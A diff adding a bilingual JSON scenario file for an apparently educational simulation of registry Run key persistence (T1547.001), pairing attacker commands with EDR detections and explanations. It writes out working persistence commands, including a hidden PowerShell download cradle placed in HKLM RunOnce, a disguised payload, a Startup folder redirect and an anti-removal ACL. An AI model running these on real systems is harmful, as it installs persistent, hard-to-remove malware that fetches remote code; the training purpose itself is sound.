@@ -1,0 +1,251 @@
+{
+  "id": "T1547.001",
+  "title": "레지스트리 Run 키 지속성 시뮬레이션",
+  "titleEn": "Registry Run Keys Persistence Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 정찰", "labelEn": "🔍 Recon", "steps": [0] },
+    { "label": "⚡ 페이로드 배치", "labelEn": "⚡ Payload Staging", "steps": [1] },
+    { "label": "🔓 지속성 등록", "labelEn": "🔓 Persistence Registration", "steps": [2, 3, 4] },
+    { "label": "🛡️ 보호 및 검증", "labelEn": "🛡️ Protection & Verification", "steps": [5, 6] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 50, "y": 80 },
+    { "id": "victim", "label": "Victim PC\nDESKTOP-SEC01", "x": 250, "y": 80 },
+    { "id": "hkcu", "label": "HKCU\\Run", "x": 400, "y": 30 },
+    { "id": "hklm", "label": "HKLM\\RunOnce", "x": 400, "y": 80 },
+    { "id": "startup", "label": "Startup Folder\n(Redirected)", "x": 400, "y": 130 },
+    { "id": "c2", "label": "C2 Server\n185.220.101.34", "x": 50, "y": 160 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "victim", "minStep": 0 },
+    { "from": "victim", "to": "hkcu", "minStep": 2 },
+    { "from": "victim", "to": "hklm", "minStep": 3 },
+    { "from": "victim", "to": "startup", "minStep": 4 },
+    { "from": "hkcu", "to": "c2", "minStep": 6 },
+    { "from": "hklm", "to": "c2", "minStep": 6 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "Registry Editor", "icon": "📝" },
+    { "name": "Windows Security", "icon": "🛡️" },
+    { "name": "{companyName} VPN", "icon": "🔒" },
+    { "name": "Task Manager", "icon": "📊" }
+  ],
+  "steps": [
+    {
+      "cmd": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" && reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"",
+      "out": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    SecurityHealth    REG_EXPAND_SZ    %windir%\\system32\\SecurityHealthSystray.exe\n    CrowdStrike       REG_SZ           \"C:\\Program Files\\CrowdStrike\\CSFalconService.exe\"\n    VMware User       REG_SZ           \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\"\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    OneDrive          REG_SZ           \"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background\n    Discord           REG_SZ           \"C:\\Users\\{userName}\\AppData\\Local\\Discord\\Update.exe\" --processStart\n\n[*] Enumerating existing Run keys for blending in...\n[*] HKLM requires admin privileges\n[*] HKCU accessible as current user",
+      "def": "[EDR] Registry Run key enumeration detected - potential persistence reconnaissance",
+      "defAction": "Source: Registry access monitoring\nTarget: HKLM\\...\\Run, HKCU\\...\\Run\nAction: Registry query logged, baseline comparison initiated",
+      "desc": "기존 레지스트리 Run 키를 조회하여 합법적인 항목과 혼합할 수 있는 위치를 파악합니다.",
+      "descEn": "The attacker enumerates existing Run keys to identify where malicious entries can blend in with legitimate ones.",
+      "stepTitle": "레지스트리 Run 키 정찰 (기존 항목 분석)",
+      "stepTitleEn": "Registry Run Key Reconnaissance (Existing Entry Analysis)",
+      "feynman": "아파트 우편함 목록을 먼저 확인하는 것과 같습니다. '여기에 어떤 이름들이 등록되어 있는지' 파악해야 가짜 이름을 넣어도 관리인이 의심하지 않습니다. HKLM은 건물 전체 공용 목록이고, HKCU는 개인 우편함입니다.",
+      "feynmanEn": "It's like first checking the apartment mailbox directory. You need to know 'what names are already registered' so that adding a fake name won't raise suspicion from the building manager. HKLM is the building-wide shared directory, while HKCU is the personal mailbox.",
+      "expert": "HKLM\\...\\Run은 모든 사용자 로그인 시 실행되며 관리자 권한이 필요하고, HKCU\\...\\Run은 현재 사용자만 대상이지만 권한 없이 수정 가능합니다. 공격자는 SecurityHealth, OneDrive 같은 합법적 항목의 명명 규칙을 분석하여 탐지를 회피하는 이름을 선택합니다.",
+      "expertEn": "HKLM\\...\\Run executes at all user logins and requires admin privileges, while HKCU\\...\\Run targets only the current user but can be modified without elevated permissions. Attackers analyze naming conventions of legitimate entries like SecurityHealth and OneDrive to choose detection-evading names.",
+      "defTooltip": "🔐 HKLM과 HKCU Run 키에 대한 열거 쿼리 감지! 지속성 정찰의 전형적인 패턴입니다.",
+      "defTooltipEn": "🔐 Enumeration queries on HKLM and HKCU Run keys detected! This is a typical persistence reconnaissance pattern.",
+      "hackerLog": {
+        "title": "reg_query_run.txt",
+        "lines": [
+          { "log": "SecurityHealth    REG_EXPAND_SZ    %windir%\\system32\\SecurityHealthSystray.exe", "desc": "💡 합법적 보안 서비스 항목 - 공격자가 이 이름을 모방하여 위장할 가능성" },
+          { "log": "HKLM requires admin privileges", "desc": "💡 HKLM 수정은 관리자 권한 필요 - UAC 우회 없이는 HKCU만 사용 가능" },
+          { "log": "HKCU accessible as current user", "desc": "💡 HKCU는 일반 사용자 권한으로 수정 가능 - 가장 흔한 지속성 위치" }
+        ]
+      },
+      "terms": [
+        { "name": "레지스트리 Run 키", "desc": "Windows 부팅/로그인 시 자동 실행할 프로그램을 등록하는 레지스트리 위치. 공격자의 가장 오래된 지속성 기법 중 하나입니다." },
+        { "name": "HKLM (HKEY_LOCAL_MACHINE)", "desc": "시스템 전체에 적용되는 레지스트리 하이브. 수정에 관리자 권한이 필요하며, 모든 사용자에게 영향을 줍니다." },
+        { "name": "HKCU (HKEY_CURRENT_USER)", "desc": "현재 로그인된 사용자에게만 적용되는 레지스트리 하이브. 일반 사용자 권한으로 수정 가능합니다." }
+      ]
+    },
+    {
+      "cmd": "copy C:\\Windows\\Temp\\payload.exe \"C:\\Users\\{userName}\\AppData\\Roaming\\Microsoft\\WindowsUpdate\\SecurityHealthService.exe\"",
+      "out": "        1 file(s) copied.\n\n[*] Payload copied to: C:\\Users\\{userName}\\AppData\\Roaming\\Microsoft\\WindowsUpdate\\SecurityHealthService.exe\n[*] File size: 156KB\n[*] Mimicking: Windows Security Health Service\n[*] Directory created: %APPDATA%\\Microsoft\\WindowsUpdate\\\n[*] File attributes set: Hidden, System\n\n[*] File location selected for:\n    - Blending with Windows Update directory structure\n    - Name mimics legitimate SecurityHealthService.exe\n    - User-writable location (no admin needed)",
+      "def": "[EDR] Suspicious file creation in AppData\\Microsoft\\WindowsUpdate with system file name",
+      "defAction": "Source: File integrity monitoring\nTarget: SecurityHealthService.exe (fake) in AppData\nAction: File hash checked against known-good baseline - MISMATCH detected",
+      "desc": "페이로드를 합법적인 Windows 서비스 이름으로 위장하여 AppData에 배치합니다.",
+      "descEn": "The attacker places the payload in AppData disguised as a legitimate Windows service name.",
+      "stepTitle": "페이로드 위장 배치 (합법적 파일명 사칭)",
+      "stepTitleEn": "Disguised Payload Staging (Legitimate Filename Impersonation)",
+      "feynman": "경찰 유니폼을 입고 경찰서 안을 돌아다니면 아무도 의심하지 않는 것과 같습니다. 악성 파일을 'SecurityHealthService.exe'라는 정상 Windows 서비스 이름으로 바꾸고, Microsoft\\WindowsUpdate 폴더에 넣으면 시스템 파일처럼 보여서 수동 검사에서도 놓치기 쉽습니다.",
+      "feynmanEn": "It's like wearing a police uniform and walking around inside a police station — nobody suspects you. By renaming the malicious file to 'SecurityHealthService.exe' (a legitimate Windows service name) and placing it in the Microsoft\\WindowsUpdate folder, it looks like a system file and is easily overlooked even during manual inspection.",
+      "expert": "공격자는 세 가지 위장 기법을 동시에 적용합니다: (1) 파일명을 합법적인 Windows 서비스(SecurityHealthService.exe)로 모방, (2) 경로를 Microsoft 하위 폴더(WindowsUpdate)로 설정하여 정상 디렉토리 구조와 혼합, (3) Hidden+System 파일 속성으로 일반 파일 탐색에서 숨깁니다.",
+      "expertEn": "The attacker applies three disguise techniques simultaneously: (1) filename mimics a legitimate Windows service (SecurityHealthService.exe), (2) path is set under a Microsoft subfolder (WindowsUpdate) to blend with normal directory structure, (3) Hidden+System file attributes hide it from standard file browsing.",
+      "defTooltip": "🔐 AppData\\Microsoft\\WindowsUpdate에서 시스템 파일명을 가진 의심스러운 파일 생성 감지! 해시 비교 불일치.",
+      "defTooltipEn": "🔐 Suspicious file creation in AppData\\Microsoft\\WindowsUpdate with system filename detected! Hash comparison mismatch.",
+      "hackerLog": {
+        "title": "payload_staging.txt",
+        "lines": [
+          { "log": "Payload copied to: ...\\WindowsUpdate\\SecurityHealthService.exe", "desc": "💡 정상 Windows 서비스명을 사칭하여 AppData에 배치 - 육안 검사 회피" },
+          { "log": "File attributes set: Hidden, System", "desc": "💡 파일 탐색기와 dir 명령에서 기본적으로 보이지 않게 설정" },
+          { "log": "Name mimics legitimate SecurityHealthService.exe", "desc": "💡 C:\\Windows\\System32에 있는 실제 파일과 동일한 이름 사용" }
+        ]
+      },
+      "terms": [
+        { "name": "페이로드 스테이징 (Payload Staging)", "desc": "실행할 악성 파일을 대상 시스템의 특정 위치에 미리 배치하는 단계. 경로와 파일명 선택이 탐지 회피에 중요합니다." },
+        { "name": "파일 속성 (File Attributes)", "desc": "Windows 파일의 메타데이터 속성. Hidden과 System 속성을 설정하면 기본 탐색기에서 보이지 않습니다." },
+        { "name": "AppData 폴더", "desc": "사용자별 애플리케이션 데이터가 저장되는 폴더. 관리자 권한 없이 쓸 수 있어 공격자가 자주 악용합니다." }
+      ]
+    },
+    {
+      "cmd": "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityHealthService\" /t REG_SZ /d \"C:\\Users\\{userName}\\AppData\\Roaming\\Microsoft\\WindowsUpdate\\SecurityHealthService.exe\" /f",
+      "out": "The operation completed successfully.\n\n[*] Registry key added:\n    Path: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    Name: SecurityHealthService\n    Type: REG_SZ\n    Data: C:\\Users\\{userName}\\AppData\\Roaming\\Microsoft\\WindowsUpdate\\SecurityHealthService.exe\n\n[*] Persistence established:\n    - Triggers on user login\n    - Runs as current user ({companyName}\\{userName})\n    - No admin privileges required\n    - Mimics legitimate Windows Security Health service",
+      "def": "[EDR] New HKCU Run key created: SecurityHealthService pointing to non-standard location",
+      "defAction": "Source: Registry modification monitoring (Sysmon Event ID 13)\nTarget: HKCU\\...\\Run\\SecurityHealthService\nAction: Registry value flagged, binary path validated - SUSPICIOUS (not in System32)",
+      "desc": "HKCU Run 키에 악성 바이너리를 등록하여 사용자 로그인 시 자동 실행되게 합니다.",
+      "descEn": "The attacker registers the malicious binary in the HKCU Run key for automatic execution at user login.",
+      "stepTitle": "HKCU Run 키 지속성 등록",
+      "stepTitleEn": "HKCU Run Key Persistence Registration",
+      "feynman": "매일 아침 출근할 때 자동으로 켜지는 에어컨 타이머를 몰래 설정하는 것과 같습니다. HKCU Run 키에 프로그램을 등록하면 사용자가 로그인할 때마다 자동으로 실행됩니다. 'SecurityHealthService'라는 이름 때문에 사용자는 이것이 Windows 보안 기능의 일부라고 생각합니다.",
+      "feynmanEn": "It's like secretly setting a timer that turns on the air conditioner automatically every morning when you come to work. Registering a program in the HKCU Run key makes it auto-execute at every user login. The name 'SecurityHealthService' makes users think it's part of Windows security.",
+      "expert": "HKCU Run 키는 관리자 권한 없이 등록 가능하므로 가장 흔한 지속성 위치입니다. Sysmon Event ID 13(Registry Value Set)이 생성되며, EDR은 Run 키의 새 항목 중 바이너리 경로가 System32가 아닌 AppData를 가리킬 때 의심스러운 것으로 판단합니다.",
+      "expertEn": "HKCU Run key is the most common persistence location since it requires no admin privileges. Sysmon Event ID 13 (Registry Value Set) is generated, and EDR flags new Run key entries when the binary path points to AppData instead of System32.",
+      "defTooltip": "🔐 HKCU Run 키에 새 항목 생성 감지! SecurityHealthService가 System32가 아닌 AppData를 가리킵니다.",
+      "defTooltipEn": "🔐 New HKCU Run key entry detected! SecurityHealthService points to AppData instead of System32.",
+      "hackerLog": {
+        "title": "reg_add_hkcu.txt",
+        "lines": [
+          { "log": "Name: SecurityHealthService", "desc": "💡 실제 Windows 보안 서비스 이름을 사칭 - HKLM의 SecurityHealth와 유사" },
+          { "log": "Data: ...\\AppData\\Roaming\\Microsoft\\WindowsUpdate\\SecurityHealthService.exe", "desc": "💡 AppData 경로가 핵심 탐지 포인트 - 정상 서비스는 System32에 위치" },
+          { "log": "No admin privileges required", "desc": "💡 HKCU는 일반 사용자 권한으로 수정 가능 - UAC 우회 불필요" }
+        ]
+      },
+      "terms": [
+        { "name": "Sysmon Event ID 13", "desc": "레지스트리 값 설정(Registry Value Set) 이벤트. Run 키 변경을 모니터링하는 핵심 탐지 소스입니다." },
+        { "name": "지속성 (Persistence)", "desc": "시스템 재부팅이나 사용자 로그오프 후에도 악성코드가 계속 실행되도록 보장하는 기법의 총칭입니다." },
+        { "name": "REG_SZ", "desc": "레지스트리 데이터 타입 중 하나로, 고정 길이 문자열을 저장합니다. 실행 파일 경로를 저장하는 데 사용됩니다." }
+      ]
+    },
+    {
+      "cmd": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"WindowsUpdateCheck\" /t REG_SZ /d \"cmd /c powershell -ep bypass -w hidden -c \\\"IEX(IWR 'https://cdn-static.{companyName}-corp.com/check.ps1')\\\"\" /f",
+      "out": "The operation completed successfully.\n\n[*] RunOnce key added (requires admin):\n    Path: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n    Name: WindowsUpdateCheck\n    Type: REG_SZ\n    Data: cmd /c powershell -ep bypass -w hidden -c \"IEX(IWR '...')\"\n\n[*] RunOnce behavior:\n    - Executes once at next system boot\n    - Runs as SYSTEM (HKLM)\n    - Self-deletes after execution\n    - Downloads fresh payload each boot\n\n[*] Purpose: Secondary persistence + payload update mechanism",
+      "def": "[EDR] HKLM RunOnce key created with PowerShell download cradle - CRITICAL",
+      "defAction": "Source: Sysmon Event ID 13 + Script Block Logging\nTarget: HKLM\\...\\RunOnce\\WindowsUpdateCheck\nAction: Registry value immediately removed, full registry audit triggered",
+      "desc": "HKLM RunOnce 키에 PowerShell 다운로드 크래들을 등록하여 SYSTEM 권한으로 실행되게 합니다.",
+      "descEn": "The attacker adds a PowerShell download cradle to HKLM RunOnce for SYSTEM-level execution at boot.",
+      "stepTitle": "HKLM RunOnce 다운로드 크래들 등록 (SYSTEM 권한)",
+      "stepTitleEn": "HKLM RunOnce Download Cradle Registration (SYSTEM Privilege)",
+      "feynman": "건물 관리 사무소의 '내일 아침 첫 번째로 할 일' 메모판에 '이 전화번호로 연락해서 새 지시를 받아라'라고 적어두는 것과 같습니다. RunOnce는 부팅 시 한 번만 실행되고 자동 삭제되므로 흔적이 적고, SYSTEM 권한으로 실행되어 최고 권한을 가집니다.",
+      "feynmanEn": "It's like writing 'call this number first thing tomorrow morning for new instructions' on the building manager's to-do board. RunOnce executes once at boot and auto-deletes, leaving fewer traces, and runs as SYSTEM with the highest privileges.",
+      "expert": "RunOnce 키는 실행 후 자동 삭제되므로 포렌식 타임라인에서 흔적이 사라집니다. IEX(IWR ...) 패턴의 다운로드 크래들은 매 부팅마다 C2에서 최신 페이로드를 받아오는 '자동 업데이트' 역할을 합니다. HKLM 경로이므로 SYSTEM 컨텍스트에서 실행되어 모든 권한을 가집니다.",
+      "expertEn": "RunOnce keys auto-delete after execution, causing traces to disappear from the forensic timeline. The IEX(IWR ...) download cradle pattern acts as an 'auto-update' that fetches the latest payload from C2 at every boot. Being in the HKLM path, it runs in the SYSTEM context with full privileges.",
+      "defTooltip": "🔐 HKLM RunOnce에 PowerShell 다운로드 크래들 등록! SYSTEM 권한의 부팅 시 자동 실행 - 즉시 제거 필요.",
+      "defTooltipEn": "🔐 PowerShell download cradle registered in HKLM RunOnce! SYSTEM-level auto-execution at boot - immediate removal required.",
+      "hackerLog": {
+        "title": "reg_add_hklm_runonce.txt",
+        "lines": [
+          { "log": "RunOnce key added (requires admin)", "desc": "💡 HKLM 수정에 관리자 권한 필요 - 이미 권한 상승에 성공한 상태" },
+          { "log": "Self-deletes after execution", "desc": "💡 실행 후 자동 삭제 - 포렌식 분석 시 레지스트리에서 흔적이 사라짐" },
+          { "log": "Downloads fresh payload each boot", "desc": "💡 매 부팅마다 C2에서 최신 페이로드 다운로드 - 방어자가 차단해도 자동 복구" }
+        ]
+      },
+      "terms": [
+        { "name": "RunOnce 키", "desc": "부팅 시 한 번만 실행되고 자동 삭제되는 레지스트리 위치. Run 키와 달리 일회성이므로 포렌식 흔적이 적습니다." },
+        { "name": "다운로드 크래들 (Download Cradle)", "desc": "원격 서버에서 스크립트를 다운로드하여 메모리에서 직접 실행하는 기법. IEX(IWR ...) 패턴이 대표적입니다." },
+        { "name": "SYSTEM 컨텍스트", "desc": "Windows에서 가장 높은 권한의 실행 컨텍스트. 모든 파일과 레지스트리에 접근 가능하며, 사용자보다 높은 권한입니다." }
+      ]
+    },
+    {
+      "cmd": "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" /v \"Startup\" /t REG_EXPAND_SZ /d \"C:\\Users\\{userName}\\AppData\\Roaming\\Microsoft\\WindowsUpdate\" /f",
+      "out": "The operation completed successfully.\n\n[*] Startup folder redirected:\n    Original: %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n    Modified: C:\\Users\\{userName}\\AppData\\Roaming\\Microsoft\\WindowsUpdate\n\n[*] Effect:\n    - All executables in WindowsUpdate folder will auto-run at login\n    - SecurityHealthService.exe will execute automatically\n    - Additional payloads can be dropped to this folder\n    - Legitimate startup items may break (side effect)\n\n[*] This technique is less monitored than Run keys",
+      "def": "[EDR] Shell Folders startup path modification detected - unusual redirect",
+      "defAction": "Source: Registry monitoring (User Shell Folders change)\nTarget: Startup folder redirect\nAction: Original startup path restored, all files in malicious directory quarantined",
+      "desc": "시작 프로그램 폴더 경로를 악성 디렉토리로 변경하여 추가적인 지속성을 확보합니다.",
+      "descEn": "The attacker redirects the Startup folder path to the malicious directory for additional persistence.",
+      "stepTitle": "시작 폴더 경로 리다이렉트 (Shell Folders 조작)",
+      "stepTitleEn": "Startup Folder Path Redirect (Shell Folders Manipulation)",
+      "feynman": "우체국에서 '이 사람의 우편물을 이제 이 주소로 보내세요'라고 전달 주소를 변경하는 것과 같습니다. Windows가 시작 프로그램을 찾는 폴더 경로를 악성 코드가 있는 폴더로 바꿔버리면, 로그인할 때마다 그 폴더 안의 모든 파일이 자동 실행됩니다.",
+      "feynmanEn": "It's like changing the forwarding address at the post office to 'send this person's mail to this address now.' When the attacker redirects the Windows Startup folder path to the folder containing malware, everything in that folder auto-executes at every login.",
+      "expert": "User Shell Folders의 Startup 경로 리다이렉트는 Run 키보다 모니터링이 적은 지속성 기법입니다. 이 변경으로 기존 정상 시작 프로그램이 작동하지 않을 수 있으므로 부작용이 있지만, 추가 페이로드를 단순히 파일 복사만으로 자동 실행시킬 수 있는 장점이 있습니다.",
+      "expertEn": "Startup path redirect via User Shell Folders is a persistence technique that receives less monitoring than Run keys. While this change can break legitimate startup items as a side effect, it has the advantage of auto-executing additional payloads through simple file copying.",
+      "defTooltip": "🔐 User Shell Folders의 Startup 경로가 비정상적 디렉토리로 리다이렉트되었습니다! 원래 경로를 복원하세요.",
+      "defTooltipEn": "🔐 User Shell Folders Startup path redirected to abnormal directory! Restore the original path.",
+      "hackerLog": {
+        "title": "startup_redirect.txt",
+        "lines": [
+          { "log": "Original: %USERPROFILE%\\...\\Start Menu\\Programs\\Startup", "desc": "💡 정상 시작 폴더 경로 - 여기에 있던 정상 프로그램들이 더 이상 실행되지 않음" },
+          { "log": "Modified: ...\\Microsoft\\WindowsUpdate", "desc": "💡 악성 페이로드가 있는 폴더로 리다이렉트 - 파일을 넣기만 하면 자동 실행" },
+          { "log": "This technique is less monitored than Run keys", "desc": "💡 User Shell Folders 변경은 대부분의 EDR에서 Run 키보다 낮은 우선순위로 모니터링" }
+        ]
+      },
+      "terms": [
+        { "name": "User Shell Folders", "desc": "Windows 특수 폴더(바탕화면, 문서, 시작 프로그램 등)의 경로를 정의하는 레지스트리 키입니다." },
+        { "name": "시작 프로그램 폴더 (Startup Folder)", "desc": "이 폴더에 있는 프로그램은 사용자 로그인 시 자동 실행됩니다. Run 키와 함께 가장 기본적인 자동 실행 방법입니다." },
+        { "name": "REG_EXPAND_SZ", "desc": "환경 변수를 포함할 수 있는 확장 문자열 레지스트리 타입. %USERPROFILE% 같은 변수가 자동으로 확장됩니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -c \"$acl = Get-Acl 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'; $rule = New-Object System.Security.AccessControl.RegistryAccessRule('{userName}','Delete','Deny'); $acl.AddAccessRule($rule); Set-Acl 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' $acl\"",
+      "out": "[*] Modifying ACL on Run registry key...\n[*] Adding Deny rule for Delete operation\n\n[+] ACL modified successfully:\n    Key: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    Added: Deny Delete for {userName}\n\n[*] Effect:\n    - Users cannot delete the malicious Run entry\n    - reg delete will return \"Access is denied\"\n    - Even admin tools may fail without ACL reset\n    - Makes cleanup more difficult\n\n[*] Anti-removal protection active",
+      "def": "[EDR] Registry ACL modification detected - Deny Delete rule added to Run key",
+      "defAction": "Source: Security descriptor change monitoring\nTarget: HKCU\\...\\Run ACL\nAction: ACL restored to default, persistence entry removed with elevated privileges",
+      "desc": "레지스트리 키의 ACL을 수정하여 악성 항목의 삭제를 방지하는 안티 리무벌 기법을 적용합니다.",
+      "descEn": "The attacker modifies registry key ACLs to prevent deletion of the malicious entry, implementing anti-removal protection.",
+      "stepTitle": "레지스트리 ACL 수정 (안티 리무벌 보호)",
+      "stepTitleEn": "Registry ACL Modification (Anti-Removal Protection)",
+      "feynman": "자물쇠를 달아놓고 열쇠를 버리는 것과 같습니다. 레지스트리 키의 '삭제 권한'을 거부하면, 사용자나 관리자가 악성 항목을 지우려고 해도 '접근이 거부되었습니다'라는 오류가 나옵니다. ACL을 먼저 원래대로 복구하지 않으면 제거가 불가능합니다.",
+      "feynmanEn": "It's like putting a padlock on something and throwing away the key. By denying 'Delete' permission on the registry key, when users or admins try to remove the malicious entry, they get an 'Access is denied' error. Removal is impossible without first restoring the ACL to default.",
+      "expert": "RegistryAccessRule의 'Deny' 규칙은 'Allow' 규칙보다 항상 우선합니다. 이 기법은 일반적인 reg delete 명령과 대부분의 GUI 도구를 무력화합니다. 복구하려면 레지스트리 키의 소유권을 먼저 가져온 후(TakeOwnership) ACL을 재설정해야 하며, 이는 SYSTEM 권한이 필요합니다.",
+      "expertEn": "The 'Deny' rule in RegistryAccessRule always takes precedence over 'Allow' rules. This technique neutralizes standard reg delete commands and most GUI tools. Recovery requires first taking ownership of the registry key (TakeOwnership), then resetting the ACL, which requires SYSTEM privileges.",
+      "defTooltip": "🔐 레지스트리 Run 키의 ACL이 수정되었습니다! Delete 작업에 대한 Deny 규칙이 추가되었습니다. 안티 리무벌 기법입니다.",
+      "defTooltipEn": "🔐 Registry Run key ACL modified! Deny rule for Delete operation added. This is an anti-removal technique.",
+      "hackerLog": {
+        "title": "acl_modification.txt",
+        "lines": [
+          { "log": "Added: Deny Delete for {userName}", "desc": "💡 Deny 규칙은 Allow보다 우선 - 관리자조차 직접 삭제 불가" },
+          { "log": "reg delete will return \"Access is denied\"", "desc": "💡 표준 삭제 명령이 실패 - IR 팀의 초기 대응을 지연시킴" },
+          { "log": "Anti-removal protection active", "desc": "💡 ACL 복원 → 소유권 변경 → 삭제 순서가 필요한 다단계 제거 절차" }
+        ]
+      },
+      "terms": [
+        { "name": "ACL (Access Control List)", "desc": "파일, 폴더, 레지스트리 등의 접근 권한을 정의하는 목록. 읽기, 쓰기, 삭제 등 각 작업별로 허용/거부를 설정합니다." },
+        { "name": "Deny 규칙", "desc": "ACL에서 특정 작업을 명시적으로 거부하는 규칙. Allow 규칙보다 항상 우선 적용됩니다." },
+        { "name": "안티 리무벌 (Anti-Removal)", "desc": "악성코드가 삭제되지 않도록 보호하는 기법. ACL 수정, 프로세스 감시, 파일 잠금 등이 사용됩니다." }
+      ]
+    },
+    {
+      "cmd": "# [Verification] System reboot and persistence verification",
+      "out": "[System Reboot - DESKTOP-SEC01]\n\n[Boot sequence - persistence triggers]\n1. HKLM RunOnce → WindowsUpdateCheck\n   > cmd.exe → powershell.exe (hidden)\n   > Downloaded fresh payload from C2\n   > RunOnce entry self-deleted ✓\n\n2. HKCU Run → SecurityHealthService\n   > SecurityHealthService.exe started (PID: 2341)\n   > C2 beacon established → 185.220.101.34:443\n   > Running as: {companyName}\\{userName}\n\n3. Startup Folder (redirected)\n   > Same executable triggered again (duplicate)\n   > Second instance terminated (mutex check)\n\n[+] All persistence mechanisms verified\n[+] Payload surviving reboots confirmed\n[+] C2 connectivity: ACTIVE",
+      "def": "[SIEM] Multiple persistence mechanisms firing at boot - coordinated malicious startup activity",
+      "defAction": "Source: Boot-time monitoring + EDR\nTarget: DESKTOP-SEC01 startup sequence\nAction: All 3 persistence mechanisms removed, system reimaged, credentials rotated",
+      "desc": "시스템 재부팅 후 모든 지속성 메커니즘이 정상적으로 작동하는지 확인합니다.",
+      "descEn": "The attacker verifies that all persistence mechanisms survive reboot and function correctly.",
+      "stepTitle": "재부팅 후 지속성 검증 (3중 메커니즘 확인)",
+      "stepTitleEn": "Post-Reboot Persistence Verification (Triple Mechanism Check)",
+      "feynman": "도둑이 집에 3개의 비밀 입구를 만들어놓고, 다음 날 3개 모두 잘 열리는지 확인하는 것과 같습니다. 첫 번째 입구(RunOnce)는 한 번 쓰고 자동 파괴되고, 두 번째 입구(Run 키)는 매일 열리며, 세 번째 입구(리다이렉트된 시작 폴더)는 예비용입니다. 하나가 막혀도 나머지가 동작합니다.",
+      "feynmanEn": "It's like a burglar creating 3 secret entrances to a house, then checking the next day that all 3 still work. The first entrance (RunOnce) is used once and self-destructs, the second (Run key) opens daily, and the third (redirected Startup folder) serves as backup. Even if one is blocked, the others still function.",
+      "expert": "다중 지속성 전략은 '깊이 있는 방어(Defense in Depth)'의 공격자 버전입니다. Mutex 체크를 통한 중복 실행 방지는 프로세스가 여러 번 시작되어 탐지 확률이 높아지는 것을 방지합니다. RunOnce의 자동 삭제는 포렌식 타임라인에서 부팅 시 실행된 명령의 증거를 제거합니다.",
+      "expertEn": "Multi-persistence strategy is the attacker's version of 'Defense in Depth.' Mutex checking prevents duplicate execution, which would increase detection probability. RunOnce's auto-deletion removes evidence of boot-time command execution from the forensic timeline.",
+      "defTooltip": "🔐 부팅 시 3개의 지속성 메커니즘이 동시에 활성화되었습니다! 조율된 악성 시작 활동입니다. 시스템 재이미징을 고려하세요.",
+      "defTooltipEn": "🔐 3 persistence mechanisms activated simultaneously at boot! Coordinated malicious startup activity. Consider system reimaging.",
+      "hackerLog": {
+        "title": "persistence_verification.txt",
+        "lines": [
+          { "log": "RunOnce entry self-deleted ✓", "desc": "💡 RunOnce는 실행 후 자동 삭제 - 포렌식 시 레지스트리에서 증거 사라짐" },
+          { "log": "SecurityHealthService.exe started (PID: 2341)", "desc": "💡 HKCU Run 키의 지속성 성공 - 매 로그인마다 자동 실행 확인" },
+          { "log": "Second instance terminated (mutex check)", "desc": "💡 중복 실행 방지 로직 - 프로세스 2개 실행으로 인한 탐지를 예방" }
+        ]
+      },
+      "terms": [
+        { "name": "Mutex (상호 배제)", "desc": "프로세스 간 동기화 메커니즘. 악성코드가 자신의 중복 실행을 방지하기 위해 고유한 Mutex를 생성합니다." },
+        { "name": "다중 지속성 (Multi-Persistence)", "desc": "여러 가지 지속성 메커니즘을 동시에 사용하여 하나가 제거되어도 다른 것이 동작하도록 보장하는 전략입니다." },
+        { "name": "시스템 재이미징 (System Reimaging)", "desc": "감염된 시스템을 깨끗한 이미지로 완전히 덮어쓰는 복구 방법. 깊이 있는 지속성 제거의 가장 확실한 방법입니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "cmd.exe (attacker)", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "reg.exe query (PID: 3001)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "reg.exe add HKCU\\Run (PID: 3101)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "reg.exe add HKLM\\RunOnce (PID: 3201)", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "reg.exe add Shell Folders (PID: 3301)", "depth": 1, "alert": true, "minStep": 4 },
+    { "name": "powershell.exe ACL modify (PID: 3401)", "depth": 1, "alert": true, "minStep": 5 },
+    { "name": "[After Reboot]", "depth": 0, "alert": false, "minStep": 6 },
+    { "name": "SecurityHealthService.exe (PID: 2341)", "depth": 1, "alert": true, "minStep": 6 },
+    { "name": "powershell.exe (RunOnce) (PID: 2401)", "depth": 1, "alert": true, "minStep": 6 }
+  ]
+}
